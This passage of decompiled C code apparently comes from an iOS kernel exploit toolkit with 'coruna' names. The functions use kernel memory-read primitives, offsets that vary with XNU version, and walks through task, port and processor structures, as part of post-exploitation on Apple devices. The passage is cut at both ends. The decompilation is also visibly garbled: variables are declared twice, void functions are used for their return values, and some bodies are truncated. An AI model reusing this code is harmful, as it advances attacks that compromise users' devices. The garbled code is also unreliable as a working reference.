          bootargs = coruna_fn_ptr_cast_2(handle,bootargs);
          if (bootargs == 0) goto check_ok;
        }
        u = bootargs;
        if (bootargs != arg) continue;
      }
check_ok:
      coruna_semaphore_timedwait(handle,250000);
      size = 0;
      count = count + 1;
      u = arg;
    } while (count != 6);
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == action) {
    return;
  }
  ___stack_chk_fail(size);
}
void coruna_call_macho_data_seg_25b54(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  coruna_macho_data_seg_34040(val,id_2,0,size_3);
  return;
}
void coruna_kernel509_via_kernel509_via_mach_vm_read_overwrite(long handle,long addr_2,uint *size,uint32_t *size_x)
{
  int err;
  long handle;
  long scratch;
  uint bootargs;
  
  bootargs = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (1 < err - 0x1f53U) {
      if (err != 0x1809 && err != 0x1c1b) {
        return;
      }
      handle = 0x14;
      err = coruna_kernel509_residual_307(handle,addr_2 + 0x20,&scratch);
      if ((err != 0) && (scratch != 0)) {
      if (0x22580a06bfffff < *(unsigned long *)(handle + 0x158)) {
      scratch = coruna_kernel509_via_fn_ptr_cast_10_12(handle,scratch,&bootargs);
      }
      scratch = coruna_fn_ptr_cast_2(handle,scratch);
      if (scratch != 0) {
      if (*(unsigned long *)(handle + 0x158) < 0x22580a06c00000) {
      if (0x1f01 < *(int *)(handle + 0x140)) {
      addr_2 = scratch;
      }
      err = coruna_kernel509_via_mach_vm_read_overwrite(handle,addr_2 + handle,&bootargs);
      if (err == 0) {
      return;
      }
      }
      else {
      if (bootargs == 0) {
      return;
      }
      bootargs = bootargs / 0x18;
      }
      *size = bootargs;
      *size_x = 0x18;
      }
      }
      return;
    }
  }
  else if ((err != 0x2258 && err != 0x2712) && err != 0x225c) {
    return;
  }
  handle = 8;
fail:
  err = coruna_kernel509_residual_307(handle,addr_2 + 0x20,&scratch);
  if ((err != 0) && (scratch != 0)) {
    if (0x22580a06bfffff < *(unsigned long *)(handle + 0x158)) {
      scratch = coruna_kernel509_via_fn_ptr_cast_10_12(handle,scratch,&bootargs);
    }
    scratch = coruna_fn_ptr_cast_2(handle,scratch);
    if (scratch != 0) {
      if (*(unsigned long *)(handle + 0x158) < 0x22580a06c00000) {
        if (0x1f01 < *(int *)(handle + 0x140)) {
          addr_2 = scratch;
        }
        err = coruna_kernel509_via_mach_vm_read_overwrite(handle,addr_2 + handle,&bootargs);
        if (err == 0) {
          return;
        }
      }
      else {
        if (bootargs == 0) {
          return;
        }
        bootargs = bootargs / 0x18;
      }
      *size = bootargs;
      *size_x = 0x18;
    }
  }
  return;
}
void coruna_mach_ports_register(long handle,mach_port_name_t arg,uint64_t val,uint64_t id_2)
{
  uint8_t *ptr;
  kern_return_t lk2;
  int err;
  long handle;
  long addr;
  mach_port_t scratch;
  int bootargs;
  uint32_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  if ((*(mach_port_name_t *)k_kernel_mach_task_self_slot != arg) ||
     (handle = *(long *)(handle + 0x1a0), handle == 0)) {
    if (*(long *)(&k_kernel_slot_19d0 + handle) == 0) {
      return;
    }
    handle = coruna_kernel509_via_fn_ptr_cast_2_4(handle);
    if (handle == 0) {
      return;
    }
    if (*(task_t *)(&k_kernel_slot_1918 + handle) + 1 < 2) {
      bootargs = 0;
      lk2 = _pid_for_task(arg,&bootargs);
      if (lk2 != 0) {
        return;
      }
      handle = coruna_macho_data_seg_34040(handle,handle,bootargs,0);
      if (handle == 0) {
        return;
      }
    }
    else {
      scratch = arg;
      lk2 = _mach_ports_register(*(task_t *)(&k_kernel_slot_1918 + handle),&scratch,1);
      if (lk2 != 0) {
        return;
      }
      if (*(int *)(handle + 0x140) == 0x1809) {
        addr = 0x308;
      }
      else {
        if (*(int *)(handle + 0x140) != 0x1c1b) {
          return;
        }
        addr = 0x318;
      }
      err = coruna_kernel509_residual_307(handle,addr + handle,&bootargs);
      if (err == 0) {
        return;
      }
      handle = coruna_fn_ptr_cast_2(handle,coruna_u64_pack((scratch), (bootargs)));
      if (handle == 0) {
        return;
      }
      handle = coruna_kernel509_via_fn_ptr_cast_2_4(handle,handle);
      if (handle == 0) {
        return;
      }
      scratch = 0;
      lk2 = _mach_ports_register(*(task_t *)(&k_kernel_slot_1918 + handle),&scratch,1);
      if (lk2 != 0) {
        return;
      }
    }
    handle = coruna_kernel509_via_fn_ptr_cast_2_5(handle,handle);
    if (handle == 0) {
      return;
    }
    if (*(mach_port_name_t *)ptr == arg) {
      *(long *)(handle + 0x1a0) = handle;
    }
  }
  coruna_kernel509_via_kernel509_via_mach_vm_read_overwrite(handle,handle,val,id_2);
  return;
}
void coruna_kernel5_via_mach_ports_register(uint64_t val,uint64_t id_2,int flags)
{
  uint8_t scratch[4];
  uint32_t bootargs;
  
  if (1 < flags + 1U) {
    coruna_mach_ports_register(val,id_2,&bootargs,scratch);
  }
  return;
}
void coruna_call_helper_25ed0(uint64_t val,uint64_t id_2)
{
  coruna_kernel5_via_mach_ports_register(val,*(uint32_t *)k_kernel_mach_task_self_slot,id_2);
  return;
}
void coruna_kernel509_via_kernel5_via_mach_ports_register(uint64_t val)
{
  int err;
  long handle;
  uint64_t scratch;
  
  handle = coruna_kernel5_via_mach_ports_register();
  if ((handle != 0) && (err = coruna_kernel509_residual_307(val,handle,&scratch), err != 0)) {
    coruna_fn_ptr_cast_2(val,scratch);
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_2_7(long handle,long addr_2,unsigned long arg)
{
  int err;
  long handle;
  unsigned long scratch;
  long bootargs;
  long thread_attr;
  
  scratch = 0;
  err = coruna_kernel509_residual_307(handle,addr_2 + (unsigned long)(4 < *(long *)(handle + 0x158) +
                                                     0xffe0abe700000000U >> 0x20) * 0x10,&thread_attr);
  if ((((err != 0) && (handle = coruna_fn_ptr_cast_2(handle,thread_attr), handle != 0)) &&
      (0x1c1a < *(int *)(handle + 0x140))) &&
     (((err = coruna_kernel509_residual_307(handle,thread_attr + 0x20,&bootargs), err != 0 &&
       (handle = coruna_fn_ptr_cast_2(handle,bootargs), handle != 0)) &&
      (((arg & 1) == 0 && (err = coruna_kernel509_via_mach_vm_read_overwrite_2(handle,bootargs + 0x38,&scratch), err != 0))
      )))) {
    if (0x1f542301dfffff < *(unsigned long *)(handle + 0x158)) {
      scratch = coruna_kernel509_residual_309(handle,scratch >> 0x20);
    }
    coruna_fn_ptr_cast_2(handle,scratch);
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_2_8(uint64_t val,uint64_t id_2,unsigned long arg)
{
  long handle;
  bool err;
  int err;
  int status;
  long addr;
  long off;
  uint u;
  unsigned long scratch;
  unsigned long bootargs;
  long thread_attr;
  
  addr = coruna_kernel509_via_fn_ptr_cast_9();
  if (addr != 0) {
    u = 0;
    do {
      err = false;
      err = coruna_kernel509_residual_307(val,addr + 0x38,&thread_attr);
      handle = thread_attr;
      status = err;
joined_r0x00034934:
      thread_attr = handle;
      if ((((status == 0) || (handle == 0)) || (off = coruna_fn_ptr_cast_2(val,handle), off == 0)) ||
         (status = coruna_kernel509_residual_307(val,handle + -0x10,&bootargs), status == 0))
      goto joined_r0x000349d4;
      off = thread_attr;
      if (arg < bootargs) {
fail:
        status = coruna_kernel509_residual_307(val,off,&thread_attr);
        handle = thread_attr;
        goto joined_r0x00034934;
      }
      status = coruna_kernel509_residual_307(val,handle + -8,&scratch);
      if (status == 0) goto joined_r0x000349d4;
      if (scratch <= arg) {
        off = thread_attr + 8;
        goto fail;
      }
      err = true;
joined_r0x000349d4:
    } while (((err != 0) && (!err)) && (err = u < 5, u = u + 1, err));
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_9(uint64_t val,uint64_t id_2)
{
  uint u;
  int err;
  long scratch;
  
  u = coruna_fn_ptr_cast_9();
  if (((u != 0) && (scratch = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(val,id_2), scratch != 0)) &&
     (err = coruna_kernel509_residual_307(val,scratch + (unsigned long)u,&scratch), err != 0)) {
    coruna_fn_ptr_cast_2(val,scratch);
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_2_9(long handle,uint64_t val,uint64_t id_2,unsigned long *arg)
{
  int err;
  unsigned long u;
  long handle;
  unsigned long size;
  unsigned long scratch;
  unsigned long scratch;
  
  err = coruna_fn_ptr_cast_10(handle,0x800000);
  if (err == 0) {
    handle = coruna_kernel509_via_fn_ptr_cast_2_8(handle,val,id_2);
    if (handle == 0) {
      return;
    }
    err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle + 0x38,0x10,&scratch);
    if (err == 0) {
      return;
    }
    if (0x1f542301dfffff < *(unsigned long *)(handle + 0x158)) {
      scratch = coruna_kernel509_residual_309(handle,scratch >> 0x20);
    }
    handle = coruna_fn_ptr_cast_2(handle,scratch);
    if (handle == 0) {
      return;
    }
    *arg = scratch & 0xfffffffffffff000;
    return;
  }
  u = coruna_mach_vm_page_info(val,id_2,arg);
  if (u == 0) {
    return;
  }
  if ((u & 1) == 0) {
    if (*(long *)(&k_kernel_slot_19e0 + handle) == 0) {
      return;
    }
    size = *(long *)(&k_kernel_slot_19e0 + handle) + u;
    coruna_fn_ptr_cast_2(handle,size);
    return;
  }
  else {
    size = u - *(long *)(handle + 0x138);
    if (u >> 0x20 == 0) {
      size = size & 0xffffffff;
    }
    coruna_fn_ptr_cast_2(handle,size);
    return;
  }
  size = u | size;
fail:
  coruna_fn_ptr_cast_2(handle,size);
  return;
}
void coruna_helper_16fd0_34c1c(uint64_t val)
{
  long handle;
  
  handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4();
  if (handle != 0) {
    coruna_kernel509_via_fn_ptr_cast_2_6(val,handle);
  }
  return;
}
void coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_6(long handle)
{
  long handle;
  int err;
  long scratch;
  
  scratch = coruna_kernel509_via_fn_ptr_cast_2_6();
  if ((scratch != 0) && (0x1f530f027fffff < *(unsigned long *)(handle + 0x158))) {
    handle = 0x18;
    if (*(int *)(handle + 0x140) < 0x2258) {
      handle = 0x20;
    }
    err = coruna_kernel509_residual_307(handle,handle + scratch,&scratch);
    if (err != 0) {
      coruna_fn_ptr_cast_2(handle,scratch);
    }
  }
  return;
}
void coruna_helper_16fd0_34db4(uint64_t val)
{
  long handle;
  
  handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4();
  if (handle != 0) {
    coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_6(val,handle);
  }
  return;
}
void coruna_kernel509_via_kernel509_via_kernel509_via_fn_ptr_cast_2_6(uint64_t val,uint64_t id_2,uint64_t *size_3)
{
  int err;
  long handle;
  long addr;
  uint64_t scratch;
  uint64_t bootargs;
  
  handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_6();
  if ((((handle != 0) && (err = coruna_kernel509_residual_307(val,handle,&bootargs), err != 0)) &&
      (addr = coruna_fn_ptr_cast_2(val,bootargs), addr != 0)) &&
     ((size_3 != (uint64_t *)0x0 && (err = coruna_kernel509_via_mach_vm_read_overwrite_2(val,handle,&scratch), err != 0)))
     ) {
    *size_3 = scratch;
  }
  return;
}
void coruna_kernel509_via_kernel509_via_kernel509_via_kernel509_via_fn_ptr_cast_2_6(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  long handle;
  
  handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4();
  if (handle != 0) {
    coruna_kernel509_via_kernel509_via_kernel509_via_fn_ptr_cast_2_6(val,handle,size_3);
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_22(long handle)
{
  bool err;
  int err;
  long handle;
  long addr;
  long off;
  long scratch;
  
  handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4();
  if (handle == 0) {
    return;
  }
  err = *(int *)(handle + 0x140);
  if (err - 0x1f53U < 2 || err == 0x1c1b) {
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
      err = coruna_fn_ptr_cast_10(handle,0x5584201);
      err = err == 0;
      addr = 0x418;
      off = 0x460;
    }
    else {
      err = coruna_fn_ptr_cast_10(handle,0x100000);
      if (err != 0) {
        off = 0x4f0;
        addr = handle + off;
        if ((0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) ||
        (err = coruna_kernel509_residual_307(handle,handle + off,&scratch), addr = scratch, err != 0)) {
        scratch = addr;
        coruna_fn_ptr_cast_2(handle,scratch);
        }
        return;
      }
      err = coruna_fn_ptr_cast_10(handle,0x84000);
      if (err != 0) {
        off = 0x4e8;
        addr = handle + off;
        if ((0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) ||
        (err = coruna_kernel509_residual_307(handle,handle + off,&scratch), addr = scratch, err != 0)) {
        scratch = addr;
        coruna_fn_ptr_cast_2(handle,scratch);
        }
        return;
      }
      err = coruna_fn_ptr_cast_10(handle,1);
      if (err != 0) {
        off = 0x4e0;
        addr = handle + off;
        if ((0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) ||
        (err = coruna_kernel509_residual_307(handle,handle + off,&scratch), addr = scratch, err != 0)) {
        scratch = addr;
        coruna_fn_ptr_cast_2(handle,scratch);
        }
        return;
      }
      err = coruna_fn_ptr_cast_10(handle,0x200);
      err = err == 0;
      addr = 0x4d0;
      off = 0x510;
    }
  }
  else {
    if (err != 0x1809) {
      return;
    }
    err = coruna_fn_ptr_cast_10(handle,0x5584201);
    err = err == 0;
    addr = 0x3c0;
    off = 0x3d8;
  }
  if (!err) {
    off = addr;
  }
fail:
  addr = handle + off;
  if ((0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) ||
     (err = coruna_kernel509_residual_307(handle,handle + off,&scratch), addr = scratch, err != 0)) {
    scratch = addr;
    coruna_fn_ptr_cast_2(handle,scratch);
  }
  return;
}
void coruna_kernel509_via_kernel509_via_fn_ptr_cast_10_22(long handle)
{
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    coruna_kernel509_via_fn_ptr_cast_10_22(handle);
  }
  else {
    coruna_kernel509_via_kernel509_via_kernel509_via_fn_ptr_cast_2_4_3(handle);
  }
  return;
}
void coruna_kernel509_via_kernel509_via_kernel509_via_fn_ptr_cast_2_4_3(uint64_t val,uint64_t id_2)
{
  uint u;
  int err;
  long handle;
  uint64_t scratch;
  
  scratch = 0;
  u = coruna_kernel509_via_fn_ptr_cast_10_23();
  if (((u != 0) && (handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(val,id_2), handle != 0)) &&
     (err = coruna_kernel509_residual_307(val,handle + (unsigned long)u,&scratch), err != 0)) {
    coruna_fn_ptr_cast_2(val,scratch);
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_23(long handle)
{
  int err;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x225c) {
    if (err - 0x1f53U < 2) {
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        return;
      }
      err = coruna_fn_ptr_cast_10(handle,0x100000);
      if (err != 0) {
        return;
      }
      err = coruna_fn_ptr_cast_10(handle,0x84000);
      if (err != 0) {
        return;
      }
      err = coruna_fn_ptr_cast_10(handle,1);
      if (err != 0) {
        return;
      }
      coruna_fn_ptr_cast_10(handle,0x200);
      return;
    }
    if (err != 0x2258) {
      return;
    }
  }
  else if (err != 0x225c) {
    if (err != 0x2712) {
      return;
    }
    err = coruna_fn_ptr_cast_10(handle,0x4000000);
    if (err != 0) {
      return;
    }
    err = coruna_fn_ptr_cast_10(handle,0x1100000);
    if (err != 0) {
      return;
    }
    err = coruna_fn_ptr_cast_10(handle,0x84000);
    if (err != 0) {
      return;
    }
    coruna_fn_ptr_cast_10(handle,1);
    return;
  }
  err = coruna_fn_ptr_cast_10(handle,0x1100000);
  if (((err == 0) && (err = coruna_fn_ptr_cast_10(handle,0x84000), err == 0)) &&
     (err = coruna_fn_ptr_cast_10(handle,1), err == 0)) {
    coruna_fn_ptr_cast_10(handle,0x200);
  }
  return;
}
void coruna_kernel509_via_kernel509_via_fn_ptr_cast_10_22_2(void)
{
  coruna_kernel509_via_fn_ptr_cast_10_22();
  return;
}
void coruna_kernel509_via_helper_16fd0_34c1c(long handle)
{
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    coruna_helper_16fd0_34c1c();
  }
  else {
    coruna_kernel509_via_fn_ptr_cast_2_10();
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_2_10(uint64_t val,uint64_t id_2)
{
  uint u;
  int err;
  long handle;
  long addr;
  long scratch;
  long bootargs;
  
  u = coruna_kernel509_via_fn_ptr_cast_10_21();
  if ((((u != 0) && (handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(val,id_2), handle != 0)) &&
      (addr = coruna_fn_ptr_cast_2(val,handle), addr != 0)) &&
     (((err = coruna_kernel509_residual_307(val,handle + (unsigned long)u,&bootargs), err != 0 &&
       (handle = coruna_fn_ptr_cast_2(val,bootargs), handle != 0)) &&
      (err = coruna_kernel509_residual_307(val,bootargs + 8,&scratch), err != 0)))) {
    coruna_fn_ptr_cast_2(val,scratch);
  }
  return;
}
void coruna_kernel5_residual_269(long handle)
{
  int err;
  
  err = *(int *)(handle + 0x140);
  if ((err < 0x1f54) && ((err == 0x1809 || err == 0x1c1b) || err == 0x1f53)) {
    return;
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_2_11(uint64_t val,long handle)
{
  uint u;
  int err;
  long handle;
  uint64_t scratch;
  long bootargs;
  
  u = coruna_fn_ptr_cast_9();
  if ((((u != 0) && (err = coruna_kernel509_residual_307(val,handle + (unsigned long)u,&bootargs), err != 0)
       ) && (handle = coruna_fn_ptr_cast_2(val,bootargs), handle != 0)) &&
     ((u = coruna_kernel5_residual_269(val), u != 0 &&
      (err = coruna_kernel509_residual_307(val,bootargs + (unsigned long)u,&scratch), err != 0)))) {
    coruna_fn_ptr_cast_2(val,scratch);
  }
  return;
}
void coruna_kernel509_via_kernel5_residual_269(uint64_t val,uint64_t id_2)
{
  uint u;
  long scratch;
  
  u = coruna_kernel5_residual_269();
  if ((u != 0) && (scratch = coruna_kernel509_via_fn_ptr_cast_9(val,id_2), scratch != 0)) {
    coruna_kernel509_residual_307(val,scratch + (unsigned long)u,&scratch);
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_2_12(uint *size,uint64_t val)
{
  uint u;
  long handle;
  uint64_t size;
  unsigned long version;
  uint port;
  unsigned long scratch;
  long bootargs;
  unsigned long thread_attr;
  unsigned long host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  thread_attr = 0;
  host_info = 0;
  handle = coruna_kernel509_via_kernel509_via_kernel509_via_fn_ptr_cast_2_6(size,val,0);
  size = 0;
  if ((handle == 0) || (size = coruna_kernel509_residual_307(size,handle + 0x78,&bootargs), (int)size == 0))
  if (*(long *)k_kernel_stack_chk_guard_slot != serial_buf) {
  ___stack_chk_fail(size);
  }
  return;
}
void coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_12(long handle,uint32_t size)
{
  int err;
  long handle;
  
  handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4();
  if ((handle != 0) && (err = coruna_kernel509_via_fn_ptr_cast_2_12(handle,handle), err != 0)) {
    *(uint32_t *)(&k_kernel_slot_18f8 + handle) = size;
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_24(long handle,uint64_t val,int flags)
{
  int err;
  long handle;
  
  if (flags == 0) {
    handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4();
    if (handle != 0) {
      err = *(int *)(handle + 0x140);
      if (err < 0x2258) {
        if (err - 0x1f53U < 2) {
          err = coruna_fn_ptr_cast_10(handle,0x100000);
          if (err == 0) {
            coruna_fn_ptr_cast_10(handle,0x5584001);
          }
        }
        else if (err == 0x1809) {
          coruna_fn_ptr_cast_10(handle,0x5584001);
        }
        else if (err == 0x1c1b) {
          coruna_fn_ptr_cast_10(handle,0x5584001);
        }
      }
      else if ((((err == 0x2258) || (err == 0x225c)) || (err == 0x2712)) &&
              (err = coruna_fn_ptr_cast_10(handle,0x5100000), err == 0)) {
        coruna_fn_ptr_cast_10(handle,0x5584001);
      }
    }
  }
  else {
    coruna_kernel509_via_fn_ptr_cast_2_10();
  }
  return;
}
void coruna_kernel509_via_kernel509_via_fn_ptr_cast_10_24(long handle,uint64_t val,int flags,uint *size)
{
  int err;
  long handle;
  uint u;
  uint scratch;
  
  scratch = 0;
  handle = coruna_kernel509_via_fn_ptr_cast_10_24();
  if (handle == 0) {
    return;
  }
  err = coruna_kernel509_via_mach_vm_read_overwrite(handle,handle,&scratch);
  if (err == 0) {
    return;
  }
  if (*(int *)(handle + 0x140) < 0x1328) {
    u = scratch >> 0x18;
  }
  else {
    u = scratch & 3;
    if (flags == 0) {
      if (u != 3) {
        return;
      }
      if (size != (uint *)0x0) {
      *size = scratch;
      }
      return;
    }
  }
  if (u != 0) {
    return;
  }
fail:
  if (size != (uint *)0x0) {
    *size = scratch;
  }
  return;
}
void coruna_call_macho_data_seg_25b54_35f28(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  coruna_kernel509_via_kernel509_via_fn_ptr_cast_10_24(val,id_2,0,size_3);
  return;
}
void coruna_mach_port_deallocate_2753c(long handle,int flags,long addr_2,uint *size)
{
  uint u;
  kern_return_t lk2;
  int err;
  long handle;
  long addr;
  vm_size_t size;
  long off;
  uint size;
  uint8_t *ptr;
  uint version;
  unsigned long port;
  long scratch;
  long bootargs;
  mach_msg_type_number_t thread_attr;
  processor_array_t host_info;
  int serial_buf [6];
  
  host_info = (processor_array_t)0x0;
  thread_attr = 0;
  scratch = 0;
  bootargs = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (1 < err - 0x1f53U) {
      if (err == 0x1809) {
        ptr = (uint8_t *)0x444;
        off = 0x20;
      }
      else {
        if (err != 0x1c1b) {
          return;
        }
        off = 0x28;
        if (*(unsigned long *)(handle + 0x158) < 0x1c1b1401000000) {
          off = 0x20;
        }
        ptr = (uint8_t *)0x4b4;
      }
      goto fail;
    }
  }
  else if ((err != 0x2258 && err != 0x225c) && err != 0x2712) {
    return;
  }
  err = coruna_fn_ptr_cast_10(handle,0x4000000);
  ptr = (uint8_t *)0x8ac;
  if (err != 0) {
    ptr = &UNK_00003d3c;
  }
  if (0x1f52 < *(int *)(handle + 0x140)) {
    if (*(long *)(&k_kernel_slot_19f8 + handle) == 0) {
      return;
    }
    coruna_macho_text_sect(serial_buf);
    off = coruna_strsep(serial_buf,"14 D9 33 F8",0,1);
    if (off == 0) {
      return;
    }
    off = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),off + -8);
    if (off == 0) {
      return;
    }
    u = coruna_call_mach_vm_machine_attribute_1d4f8_20f14();
    if (u == 0) {
      version = 0;
    }
    else {
      size = 0;
      version = 0;
      thread_attr = u;
      do {
        err = coruna_kernel509_residual_307(handle,off + (unsigned long)(*(int *)(handle + 0x168) * size),&bootargs);
        if (err == 0) {
          return;
        }
        if (bootargs == 0) {
          handle = 0;
        }
        else {
          addr = coruna_fn_ptr_cast_2(handle);
          handle = bootargs;
          if (addr == 0) {
            return;
          }
        }
        err = coruna_kernel509_residual_307(handle,handle + 0x28,&scratch);
        if (err == 0) {
          return;
        }
        handle = coruna_fn_ptr_cast_2(handle,scratch);
        if (handle == 0) {
          return;
        }
        err = coruna_kernel509_via_mach_vm_read_overwrite(handle,ptr + scratch,serial_buf);
        if (err == 0) {
          return;
        }
        if (1 < serial_buf[0] - 1U) {
          return;
        }
        if (serial_buf[0] == flags) {
          if (*size <= version) {
            return;
          }
          *(long *)(addr_2 + (unsigned long)version * 8) = bootargs;
          version = version + 1;
        }
        size = size + 1;
      } while (size < u);
    }
    *size = version;
    return;
  }
  off = 0x28;
fail:
  lk2 = _host_processors(*(host_priv_t *)(&k_kernel_slot_1920 + handle),&host_info,&thread_attr);
  if (lk2 == 0) {
    if (thread_attr == 0) {
      u = 0;
    }
    else {
      port = 0;
      u = 0;
      do {
        handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(handle,host_info[port]);
        bootargs = handle;
        if ((((handle == 0) || (err = coruna_kernel509_residual_307(handle,handle + off,&scratch), err == 0))
            || (addr = coruna_fn_ptr_cast_2(handle,scratch), addr == 0)) ||
           ((err = coruna_kernel509_via_mach_vm_read_overwrite(handle,ptr + scratch,serial_buf), err == 0 ||
            (1 < serial_buf[0] - 1U)))) goto code_r0x000362cc;
        if (serial_buf[0] == flags) {
          if (*size <= u) goto code_r0x000362cc;
          *(long *)(addr_2 + (unsigned long)u * 8) = handle;
          u = u + 1;
        }
        port = port + 1;
      } while (port < thread_attr);
    }
    *size = u;
code_r0x000362cc:
    ptr = k_kernel_mach_task_self_slot;
    if (thread_attr == 0) {
      size = 0;
    }
    else {
      port = 0;
      do {
        _mach_port_deallocate(*(ipc_space_t *)ptr,host_info[port]);
        port = port + 1;
      } while (port < thread_attr);
      size = (unsigned long)thread_attr << 2;
    }
    _vm_deallocate(*(vm_map_t *)ptr,(vm_address_t)host_info,size);
  }
  return;
}
void coruna_kernel5_residual_270(long handle)
{
  int err;
  
  err = *(int *)(handle + 0x140);
  if (1 < err - 0x1f53U) {
    if (err == 0x1809) {
      return;
    }
    if (err != 0x1c1b) {
      return;
    }
  }
  return;
}
void coruna_helper_24abc_36410(void)
{
  return;
}
void coruna_kernel509_via_helper_24abc_36410(uint64_t val,uint64_t id_2)
{
  long handle;
  
  handle = coruna_kernel509_via_kernel5_via_mach_ports_register(val,*(uint32_t *)k_kernel_mach_task_self_slot,id_2);
  if (handle != 0) {
    coruna_helper_24abc_36410(val,handle);
  }
  return;
}
void coruna_kernel509_via_kernel509_via_helper_24abc_36410(uint64_t val)
{
  int err;
  long scratch;
  
  scratch = coruna_kernel509_via_helper_24abc_36410();
  if ((scratch != 0) && (err = coruna_kernel509_residual_307(val,scratch,&scratch), err != 0)) {
    coruna_fn_ptr_cast_2(val,scratch);
  }
  return;
}
void coruna_kernel509_via_kernel509_via_kernel509_via_helper_24abc_36410(long handle)
{
  long handle;
  unsigned long u;
  long scratch;
  
  scratch = coruna_kernel509_via_kernel509_via_helper_24abc_36410();
  if (scratch != 0) {
    u = *(unsigned long *)(handle + 0x158);
    if (u < 0x1c1b0a80100000) {
      handle = scratch + 0x18;
    }
    else {
      if (0x44a < u >> 0x2b) {
        return;
      }
      handle = 0x18;
      if (u < 0x1c1b1914600000) {
        handle = 0x20;
      }
      handle = handle + scratch;
    }
    coruna_kernel509_residual_307(handle,handle,&scratch);
  }
  return;
}
void coruna_kernel509_via_processor_set_info(long handle,int flags)
{
  long handle;
  uint64_t u;
  uint8_t scratch[8];
  
  if (*(long *)(handle + 0x1a8) == 0) {
    u = coruna_processor_set_info(handle);
    if ((int)u + 1U < 2) {
      return;
    }
    handle = coruna_kernel509_via_kernel5_via_mach_ports_register(handle,*(uint32_t *)k_kernel_mach_task_self_slot,u);
    if (handle == 0) {
      return;
    }
    *(long *)(handle + 0x1a8) = handle;
  }
  if ((flags != 1) && (handle = coruna_kernel509_via_fn_ptr_cast_2_4(handle), handle != 0)) {
    coruna_kernel509_residual_307(handle,handle + (unsigned long)(uint)(*(int *)(handle + 0x168) * flags) + 0x10,scratch)
    ;
  }
  return;
}
void coruna_kernel509_via_kernel509_via_kernel509_via_fn_ptr_cast_2_4_4(long handle,uint64_t val,uint64_t *id_2)
{
  int err;
  long handle;
  uint64_t scratch;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f53) {
    if (err != 0x1809 && err != 0x1c1b) {
      return;
    }
  }
  else if (1 < err - 0x1f53U && err != 0x2258) {
    return;
  }
  handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(handle);
  if (((handle != 0) && (err = coruna_kernel509_residual_307(handle,handle + 0x38,&scratch), err != 0)) &&
     (handle = coruna_fn_ptr_cast_2(handle,scratch), handle != 0)) {
    *id_2 = scratch;
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_2_13(long handle,int flags,uint64_t *val)
{
  int err;
  long handle;
  int status;
  long addr;
  uint64_t scratch;
  long bootargs;
  long thread_attr;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
fail:
      addr = 0xf8;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        addr = 0x100;
      }
      goto code_r0x000368f0;
    }
    if (err == 0x1809) {
      addr = 0x108;
      goto code_r0x000368f0;
    }
    status = 0x1c1b;
  }
  else {
    if (err == 0x2258 || err == 0x225c) goto fail;
    status = 0x2712;
  }
  if (err != status) {
    return;
  }
  addr = 0xf8;
code_r0x000368f0:
  handle = coruna_helper_16fd0_34c1c(handle,*(uint32_t *)k_kernel_mach_task_self_slot);
  if (((handle != 0) && (err = coruna_kernel509_residual_307(handle,handle + addr,&thread_attr), err != 0)) &&
     (addr = coruna_fn_ptr_cast_2(handle,thread_attr), addr != 0)) {
    if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
      err = coruna_kernel509_residual_307(handle,thread_attr,&bootargs);
      if (err == 0) {
        return;
      }
      addr = coruna_fn_ptr_cast_2(handle,bootargs);
      if (addr == 0) {
        return;
      }
    }
    else {
      bootargs = thread_attr;
    }
    err = coruna_kernel509_residual_307(handle,bootargs + (long)*(int *)(handle + 0x168) * (long)flags,
                         &scratch);
    if ((err != 0) && (addr = coruna_fn_ptr_cast_2(handle,scratch), addr != 0)) {
      *val = scratch;
    }
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_2_14(long handle,uint64_t val,uint64_t *id_2)
{
  bool err;
  int err;
